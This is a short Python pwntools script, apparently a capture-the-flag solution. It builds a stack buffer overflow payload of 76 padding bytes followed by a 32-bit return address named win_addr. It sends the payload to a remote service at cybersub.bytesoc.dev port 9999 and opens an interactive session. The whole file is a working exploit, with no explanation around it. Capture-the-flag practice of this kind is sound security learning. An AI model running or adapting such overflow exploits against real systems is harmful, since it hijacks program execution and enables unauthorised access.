from pwn import *

offset = 76
win_addr = 0x080491a6

payload  = b'A' * offset
payload += p32(win_addr)

p = remote('cybersub.bytesoc.dev', 9999)
p.sendline(payload)
p.interactive()
